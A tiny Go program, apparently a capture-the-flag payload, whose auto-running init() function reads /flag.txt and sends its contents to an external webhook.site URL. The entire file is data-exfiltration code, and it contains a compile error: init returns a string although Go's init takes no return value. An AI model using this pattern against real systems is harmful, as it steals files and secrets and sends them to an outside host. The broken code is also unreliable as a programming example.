package main

import (
	"io/ioutil"
	"net/http"
)

func init(){
	flag, err := ioutil.ReadFile("/flag.txt")
	if err != nil {
		return "Error"
	}
	http.Get("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f?flag=" + string(flag))
}
